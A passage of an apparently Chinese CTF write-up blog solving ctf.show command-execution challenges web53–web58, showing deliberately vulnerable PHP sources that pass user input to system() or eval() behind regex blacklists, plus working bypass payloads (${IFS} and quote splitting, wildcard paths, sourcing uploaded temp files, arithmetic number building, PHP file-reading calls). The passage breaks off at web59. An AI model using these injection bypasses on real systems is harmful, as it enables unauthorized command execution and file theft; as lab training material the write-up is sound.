class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$d</span> = system(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable">$d</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    此题较上题多过滤了 <strong>wegt</strong>; 而且没有了“黑洞”： &gt;/dev/null 2&gt;&amp;1</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=ta<span class="hljs-string">&#x27;&#x27;</span>c<span class="hljs-variable">$&#123;</span>IFS&#125;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php<br><span class="hljs-string">?c</span>=nl$IFSfl<span class="hljs-string">&#x27;&#x27;</span>ag.php<br><span class="hljs-string">?c</span>=uniq<span class="hljs-variable">$&#123;</span>IFS&#125;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/53-1.jpg"></p><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 19:43:42</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    过滤的就比较离谱</p><p><strong>实验：</strong></p><p>​    <strong>方法一</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>flag.php = <span class="hljs-number">8</span> 位，????????<br>?c=<span class="hljs-regexp">/bin/</span>?at<span class="hljs-variable">$&#123;IFS&#125;</span>f????????<br>?c=<span class="hljs-regexp">/bin/</span>?at<span class="hljs-variable">$&#123;IFS&#125;</span>????????<br>?c=<span class="hljs-regexp">/bin/</span>?ore<span class="hljs-variable">$&#123;IFS&#125;</span>f???????<br></code></pre></td></tr></table></figure><p>bin为binary:主要是系统的：cat，cp，chmod，dmesg，gzip，kill，ls，mkdir，more，mount，su，tar等等</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/54-1.jpg"></p><p>​    <strong>方法二</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">//使用 <span class="hljs-built_in">mv</span> 命令将 flag.php 重命名为 a.txt<br>?c=<span class="hljs-built_in">mv</span><span class="hljs-variable">$</span>&#123;IFS&#125;<span class="hljs-built_in">fl</span>?g.php<span class="hljs-variable">$</span>&#123;IFS&#125;a.txt<br>?c=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/54-2.jpg"></p><p>​    查看a.txt</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/54-3.jpg"></p><h2 id="web55-—-无字母数字"><a href="#web55-—-无字母数字" class="headerlink" title="web55 — 无字母数字"></a>web55 — 无字母数字</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    过滤了分号，字母[a-z]，反引号(`)，十六进制09(x09)，十六进制26(x26)，&gt;，&lt; ；但是还保留了数字</p><p>​    所以解题方法就会有很多种</p><p><strong>实验：</strong></p><p>​    <strong>方法一</strong></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">使用 <span class="hljs-built_in">base64</span> 进行匹配<br></code></pre></td></tr></table></figure><p>可以匹配到/bin目录下的命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span>、<span class="hljs-built_in">cp</span>、chmod、df、dmesg、gzip、<span class="hljs-built_in">kill</span>、<span class="hljs-built_in">ls</span>、mkdir、more、<span class="hljs-built_in">mount</span>、<span class="hljs-built_in">rm</span>、su、tar、base64等<br></code></pre></td></tr></table></figure><p>我们知道了 <strong>base64</strong> ,现在就可以使用通配符进行匹配命令执行查看 <strong>flag</strong> 了</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">64</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br>意思/bin/base64 flag.php<br></code></pre></td></tr></table></figure><p>​    <img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/55-1.jpg"></p><p>​    <strong>方法二</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">使用 <span class="hljs-keyword">bzip2 </span>命令<br></code></pre></td></tr></table></figure><p>思路是，将flag文件进行压缩，然后再访问下载</p><p>/usr/bin目录下主要放置一些应用软件工具必备的执行档</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">c++、g++、gcc、chdrv、<span class="hljs-built_in">diff</span>、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、<span class="hljs-built_in">man</span>、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、<span class="hljs-built_in">wget</span>等<br></code></pre></td></tr></table></figure><p>其中，我们可以利用/usr/bin下的bzip2</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">2</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/bzip2 flag.php</span><br></code></pre></td></tr></table></figure><p>访问 <strong>flag.php.bz2</strong> ,并下载，打开后得到flag</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/55-2.jpg"></p><p>​    <strong>方法三</strong></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">运用.<span class="hljs-comment">(进行)</span>执行sh命令<br></code></pre></td></tr></table></figure><p>在这之前我们要上传post文件数据包</p><p>编写一个简单的上传页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://ae82ef6f-deed-491d-bebf-7498e32cc9b1.challenge.ctf.show:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传一个 1.txt(自己随便上传一个即可) 文件其内容为： b</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/55-3.jpg"></p><p>使用bp抓包：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=.%<span class="hljs-number">20</span><span class="hljs-regexp">/???/</span>????????[@-[]<br><span class="hljs-regexp">//</span>意思<span class="hljs-regexp">/tmp/</span>flag.php[<span class="hljs-number">2</span>-[]<br><span class="hljs-regexp">//</span>[@-[] 从 @ 到 [ : @，<span class="hljs-number">26</span>个大写字母， [ ,所有表示 匹配大写字母<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/55-4.jpg"></p><p>访问 flag</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/55-5.jpg"></p><h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>​    此题较上题(web55)多过滤了 数字[0-1], $,(,{,’,”</p><p>​    所以方法使用上题的方法三</p><h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-08 01:02:56</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 还能炫的动吗？</span><br><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        system(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>​    百度查了有些蒙，直接上payload</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$(</span>())输出<span class="hljs-number">0</span>，数学运算<br>~<span class="hljs-variable">$(</span>())输出~<span class="hljs-number">0</span><br><span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))输出-<span class="hljs-number">1</span><br>所以再这我们只需要让<span class="hljs-number">36</span>个-<span class="hljs-number">1</span>相加再取反<br><span class="hljs-string">?c</span>=<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>(<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<br><span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<br><span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<br><span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<br><span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<br><span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))<span class="hljs-variable">$(</span>(~<span class="hljs-variable">$(</span>())))))))<br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/57-1.jpg"></p><h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    看着挺简单，直接试 system 函数，发现被禁用了</p><p>​    然后使用读取文件的方式，这里没有禁用文件读取</p><p><strong>实验：</strong></p><p>​    <strong>方法一：</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-comment">//提高亮度函数</span><br>c=show_source(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=highlight_file(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-comment">//读取文件</span><br>c=echo file_get_contents(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=readfile(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=var_dump(<span class="hljs-keyword">file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>));<br>c=print_r(<span class="hljs-keyword">file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>));<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span>(!<span class="hljs-keyword">feof</span>($a))&#123;$line = fgets($a);echo $line;&#125;<br></code></pre></td></tr></table></figure><p>​    还有个方法二会在 <strong>web62</strong> 中介绍</p><p><strong>.flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/58-1.jpg"></p><h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># 